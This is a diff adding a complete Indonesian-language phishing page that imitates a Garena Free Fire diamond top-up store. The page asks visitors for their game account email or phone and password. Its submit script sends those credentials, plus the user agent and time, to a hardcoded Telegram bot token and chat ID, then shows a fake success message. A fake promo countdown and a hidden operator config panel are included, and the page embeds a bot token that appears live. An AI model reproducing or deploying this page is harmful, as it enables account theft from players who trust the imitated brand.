@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top Up Free Fire - Garena</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --ff-red: #d92b3a;
+            --ff-dark: #1a202c;
+            --ff-gold: #ffc107;
+        }
+        body {
+            background-color: #f8f9fa;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .ff-header {
+            background: linear-gradient(to right, var(--ff-dark), #2d3748);
+            border-bottom: 2px solid var(--ff-red);
+        }
+        .ff-btn {
+            background-color: var(--ff-red);
+            transition: all 0.3s;
+        }
+        .ff-btn:hover {
+            background-color: #b91c1c;
+            transform: translateY(-2px);
+        }
+        .ff-card {
+            transition: all 0.3s;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .ff-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            border-color: var(--ff-red);
+        }
+        .ff-badge {
+            background: linear-gradient(45deg, var(--ff-red), #ff6b6b);
+            color: white;
+            font-weight: bold;
+        }
+        .ff-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .ff-modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border-top: 5px solid var(--ff-red);
+        }
+        .ff-banner {
+            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://a.top4top.io/p_3547o5zpj0.png');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            border-radius: 10px;
+            overflow: hidden;
+            min-height: 200px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .config-panel {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            z-index: 1001;
+            width: 300px;
+            display: none; 
+        }
+        .config-toggle {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: var(--ff-red);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 1002;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        .package-selected {
+            border: 2px solid var(--ff-red);
+            background-color: #fff5f5;
+        }
+        .auth-panel {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            z-index: 1003;
+            width: 300px;
+            display: none;
+        }
+        .hidden-info {
+            filter: blur(4px);
+            transition: filter 0.3s;
+        }
+        .hidden-info:hover {
+            filter: none;
+        }
+        .show-password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 38px;
+            cursor: pointer;
+            color: #666;
+        }
+        .countdown {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--ff-red);
+            text-align: center;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="config-toggle" id="configToggle">
+        <i class="fas fa-cog"></i>
+    </div>
+
+    <div class="auth-panel" id="authPanel">
+        <h3 class="font-bold text-lg mb-3 text-center">Autentikasi Admin</h3>
+        <div class="mb-3">
+            <label class="block text-sm font-medium mb-1">Password Admin:</label>
+            <input type="password" id="adminPassword" class="w-full px-3 py-2 border rounded" placeholder="Masukkan password admin">
+        </div>
+        <button id="loginAdmin" class="ff-btn text-white w-full py-2 rounded">Masuk</button>
+    </div>
+
+    <div class="config-panel" id="configPanel">
+        <h3 class="font-bold text-lg mb-3">Konfigurasi Bot Telegram</h3>
+        <div class="mb-3">
+            <label class="block text-sm font-medium mb-1">Chat ID Bot Telegram:</label>
+            <div class="relative">
+                <input type="text" id="botChatId" class="w-full px-3 py-2 border rounded hidden-info" placeholder="MASUKAN CET ID BOT LU MEM" readonly>
+                <i class="fas fa-eye show-password-toggle" onclick="toggleVisibility('botChatId')"></i>
+            </div>
+        </div>
+        <div class="mb-3">
+            <label class="block text-sm font-medium mb-1">Token Bot Telegram:</label>
+            <div class="relative">
+                <input type="text" id="botToken" class="w-full px-3 py-2 border rounded hidden-info" placeholder="MASUKAN TOKEN BOT LU MEM" readonly>
+                <i class="fas fa-eye show-password-toggle" onclick="toggleVisibility('botToken')"></i>
+            </div>
+        </div>
+        <div class="mb-3">
+            <label class="block text-sm font-medium mb-1">Test Connection:</label>
+            <button id="testConnection" class="w-full bg-blue-500 text-white py-2 rounded mb-2">Test Koneksi Bot</button>
+            <p id="testResult" class="text-sm text-center hidden"></p>
+        </div>
+        <button id="saveConfig" class="ff-btn text-white w-full py-2 rounded">Simpan Konfigurasi</button>
+        <button id="logoutAdmin" class="w-full bg-gray-500 text-white py-2 rounded mt-2">Logout</button>
+    </div>
+    
+    <div class="container mx-auto px-4 py-8 max-w-4xl">
+        <div class="ff-banner p-6 text-center mb-8">
+            <h1 class="text-3xl md:text-4xl font-bold mb-2 text-white drop-shadow-md">TOP UP FREE FIRE</h1>
+            <p class="text-lg text-white drop-shadow-md">Dapatkan diamond Free Fire dengan harga terbaik!</p>
+            <div class="countdown" id="countdown">Promo berakhir dalam: 05:00</div>
+        </div>
+     
+        <h2 class="text-2xl font-bold mb-4 text-center">Pilih Paket Diamond</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8" id="packageContainer">
+            <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="70" data-price="10000">
+                <div class="bg-red-600 text-white py-2 text-center">
+                    <span class="ff-badge px-3 py-1 text-sm">POPULER</span>
+                </div>
+                <div class="p-4 text-center">
+                    <h3 class="font-bold text-xl">70 Diamond</h3>
+                    <p class="text-gray-600 mb-2">Rp 10.000</p>
+                    <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+                </div>
+            </div>
+            
+            <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="140" data-price="20000">
+                <div class="p-4 text-center">
+                    <h3 class="font-bold text-xl">140 Diamond</h3>
+                    <p class="text-gray-600 mb-2">Rp 20.000</p>
+                    <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+                </div>
+            </div>
+            
+            <div class="ff-card bg-white rounded-lg overflow-hidden" data-diamond="355" data-price="50000">
+                <div class="p-4 text-center">
+                    <h3 class="font-bold text-xl">355 Diamond</h3>
+                    <p class="text-gray-600 mb-2">Rp 50.000</p>
+                    <button class="buy-btn ff-btn text-white px-4 py-2 rounded">Beli Sekarang</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-lg shadow-lg p-6 mb-8" id="loginFormContainer" style="display: none;">
+            <h2 class="text-2xl font-bold mb-4 text-center">Login untuk Melakukan Top Up</h2>
+            <p class="text-center text-gray-600 mb-4">Anda memilih paket <span id="selectedPackage" class="font-bold">70 Diamond</span> seharga <span id="selectedPrice" class="font-bold">Rp 10.000</span></p>
+            <form id="loginForm">
+                <div class="mb-4">
+                    <label class="block text-gray-700 mb-2" for="email">Email/No. Telepon</label>
+                    <input type="text" id="email" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500" placeholder="Masukkan email atau nomor telepon" required>
+                </div>
+                <div class="mb-6 relative">
+                    <label class="block text-gray-700 mb-2" for="password">Password</label>
+                    <input type="password" id="password" class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500" placeholder="Masukkan password" required>
+                    <i class="fas fa-eye show-password-toggle" onclick="togglePasswordVisibility('password')"></i>
+                </div>
+                <button type="submit" class="ff-btn text-white w-full py-3 rounded-lg font-bold">LOGIN & LANJUTKAN PEMBAYARAN</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="ff-modal" id="loginModal">
+        <div class="ff-modal-content">
+            <h3 class="font-bold text-xl mb-4 text-center" id="modalTitle">Login Berhasil</h3>
+            <p class="mb-4 text-center" id="modalMessage">Anda akan diarahkan ke halaman pembayaran.</p>
+            <button class="ff-btn text-white w-full py-2 rounded" onclick="closeModal()">Tutup</button>
+        </div>
+    </div>
+
+    <script>
+        // Variabel global untuk menyimpan konfigurasi
+        let botConfig = {
+            chatId: '7169491930',
+            token: '8597304966:AAEJ24td3Dw7aR9FFeQW8vNUTaP8nG77ZIU'
+        };
+        
+        // Variabel untuk status autentikasi
+        let isAuthenticated = false;
+        const ADMIN_PASSWORD = ''ucok; // Ganti dengan password yang lebih kuat
+        
+        // Variabel untuk menyimpan paket yang dipilih
+        let selectedPackage = null;
+
+        // Timer countdown
+        let countdownInterval;
+        function startCountdown() {
+            let timeLeft = 5 * 60; // 5 menit dalam detik
+            const countdownElement = document.getElementById('countdown');
+            
+            clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = "Promo telah berakhir!";
+                    return;
+                }
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownElement.textContent = `Promo berakhir dalam: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                timeLeft--;
+            }, 1000);
+        }
+
+        // Fungsi untuk mengenkripsi teks (enkripsi sederhana untuk penyembunyian)
+        function simpleEncrypt(text) {
+            return btoa(encodeURIComponent(text));
+        }
+        
+        // Fungsi untuk mendekripsi teks
+        function simpleDecrypt(encryptedText) {
+            try {
+                return decodeURIComponent(atob(encryptedText));
+            } catch (e) {
+                return encryptedText;
+            }
+        }
+        
+        // Toggle visibilitas field konfigurasi
+        function toggleVisibility(fieldId) {
+            const field = document.getElementById(fieldId);
+            field.classList.toggle('hidden-info');
+            field.readOnly = !field.readOnly;
+        }
+        
+        // Toggle visibilitas password
+        function togglePasswordVisibility(fieldId) {
+            const field = document.getElementById(fieldId);
+            const icon = field.nextElementSibling;
+            if (field.type === 'password') {
+                field.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                field.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        // Toggle konfigurasi panel
+        document.getElementById('configToggle').addEventListener('click', function() {
+            if (isAuthenticated) {
+                const panel = document.getElementById('configPanel');
+                panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+                document.getElementById('authPanel').style.display = 'none';
+            } else {
+                document.getElementById('authPanel').style.display = 'block';
+                document.getElementById('configPanel').style.display = 'none';
+            }
+        });
+
+        // Autentikasi admin
+        document.getElementById('loginAdmin').addEventListener('click', function() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === ADMIN_PASSWORD) {
+                isAuthenticated = true;
+                document.getElementById('authPanel').style.display = 'none';
+                document.getElementById('configPanel').style.display = 'block';
+                document.getElementById('adminPassword').value = '';
+            } else {
+                alert('Password admin salah!');
+            }
+        });
+
+        // Logout admin
+        document.getElementById('logoutAdmin').addEventListener('click', function() {
+            isAuthenticated = false;
+            document.getElementById('configPanel').style.display = 'none';
+        });
+
+        // Test koneksi bot
+        document.getElementById('testConnection').addEventListener('click', async function() {
+            const testResult = document.getElementById('testResult');
+            testResult.classList.remove('hidden', 'text-green-500', 'text-red-500');
+            testResult.textContent = 'Menguji koneksi...';
+            
+            try {
+                const url = `https://api.telegram.org/bot${botConfig.token}/getMe`;
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    testResult.textContent = '✅ Koneksi berhasil! Bot ditemukan: ' + data.result.first_name;
+                    testResult.classList.add('text-green-500');
+                } else {
+                    testResult.textContent = '❌ Token bot tidak valid!';
+                    testResult.classList.add('text-red-500');
+                }
+            } catch (error) {
+                testResult.textContent = '❌ Gagal terhubung ke Telegram API!';
+                testResult.classList.add('text-red-500');
+            }
+            
+            testResult.classList.remove('hidden');
+        });
+
+        // Simpan konfigurasi
+        document.getElementById('saveConfig').addEventListener('click', function() {
+            if (!isAuthenticated) {
+                alert('Anda harus login sebagai admin terlebih dahulu!');
+                return;
+            }
+            
+            botConfig.chatId = document.getElementById('botChatId').value;
+            botConfig.token = document.getElementById('botToken').value;
+            
+            if (botConfig.chatId && botConfig.token) {
+                // Enkripsi dan simpan ke localStorage
+                const encryptedConfig = {
+                    chatId: simpleEncrypt(botConfig.chatId),
+                    token: simpleEncrypt(botConfig.token)
+                };
+                
+                localStorage.setItem('botConfig', JSON.stringify(encryptedConfig));
+                alert('Konfigurasi berhasil disimpan!');
+                document.getElementById('configPanel').style.display = 'none';
+            } else {
+                alert('Harap isi Chat ID dan Token dengan benar!');
+            }
+        });
+
+        // Muat konfigurasi dari localStorage jika ada
+        window.addEventListener('DOMContentLoaded', function() {
+            // Setel nilai default dari token dan chat ID yang Anda berikan
+            document.getElementById('botChatId').value = botConfig.chatId;
+            document.getElementById('botToken').value = botConfig.token;
+            
+            const savedConfig = localStorage.getItem('botConfig');
+            if (savedConfig) {
+                try {
+                    const encryptedConfig = JSON.parse(savedConfig);
+                    botConfig.chatId = simpleDecrypt(encryptedConfig.chatId);
+                    botConfig.token = simpleDecrypt(encryptedConfig.token);
+                    
+                    document.getElementById('botChatId').value = botConfig.chatId;
+                    document.getElementById('botToken').value = botConfig.token;
+                } catch (e) {
+                    console.error('Error loading config:', e);
+                }
+            }
+            
+            // Mulai countdown
+            startCountdown();
+        });
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(message) {
+            if (!botConfig.chatId || !botConfig.token) {
+                console.error('Bot Telegram belum dikonfigurasi!');
+                return false;
+            }
+            
+            try {
+                const url = `https://api.telegram.org/bot${botConfig.token}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: botConfig.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Fungsi untuk menampilkan modal
+        function showModal(title, message) {
+            document.getElementById('modalTitle').textContent = title;
+            document.getElementById('modalMessage').textContent = message;
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        // Fungsi untuk menutup modal
+        function closeModal() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
+
+        // Event listener untuk tombol beli
+        document.querySelectorAll('.buy-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                const packageCard = this.closest('.ff-card');
+                selectedPackage = {
+                    diamond: packageCard.getAttribute('data-diamond'),
+                    price: packageCard.getAttribute('data-price')
+                };
+                
+                // Tampilkan form login
+                document.getElementById('selectedPackage').textContent = `${selectedPackage.diamond} Diamond`;
+                document.getElementById('selectedPrice').textContent = `Rp ${parseInt(selectedPackage.price).toLocaleString('id-ID')}`;
+                document.getElementById('loginFormContainer').style.display = 'block';
+                
+                // Scroll ke form login
+                document.getElementById('loginFormContainer').scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Event listener untuk form login
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Format pesan untuk dikirim ke Telegram
+            const message = `🔐 <b>LOGIN FREE FIRE BARU</b>\n📧 <b>Email/Telepon:</b> <code>${email}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n💎 <b>Paket Diamond:</b> ${selectedPackage.diamond} Diamond\n💰 <b>Harga:</b> Rp ${parseInt(selectedPackage.price).toLocaleString('id-ID')}\n🌐 <b>User Agent:</b> ${navigator.userAgent}\n⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+            
+            // Kirim data ke Telegram
+            const success = await sendToTelegram(message);
+            
+            if (success) {
+                showModal('Login Berhasil', 'Proses pembayaran akan segera dimulai. Anda akan diarahkan ke halaman pembayaran.');
+                // Reset form
+                document.getElementById('loginForm').reset();
+                document.getElementById('loginFormContainer').style.display = 'none';
+                
+                // Simpan log di localStorage untuk pelacakan
+                const logEntry = {
+                    timestamp: new Date().toISOString(),
+                    email: email,
+                    package: selectedPackage.diamond,
+                    status: 'terkirim'
+                };
+                
+                let logs = JSON.parse(localStorage.getItem('telegramLogs') || '[]');
+                logs.push(logEntry);
+                localStorage.setItem('telegramLogs', JSON.stringify(logs));
+            } else {
+                showModal('Error', 'Terjadi kesalahan saat mengirim data. Silakan coba lagi.');
+            }
+        });
+
+        // Tutup modal dengan menekan di luar konten
+        window.addEventListener('click', function(e) {
+            const modal = document.getElementById('loginModal');
+            if (e.target === modal) {
+                closeModal();
+            }
+            
+            const authPanel = document.getElementById('authPanel');
+            if (e.target === authPanel) {
+                authPanel.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>tml>
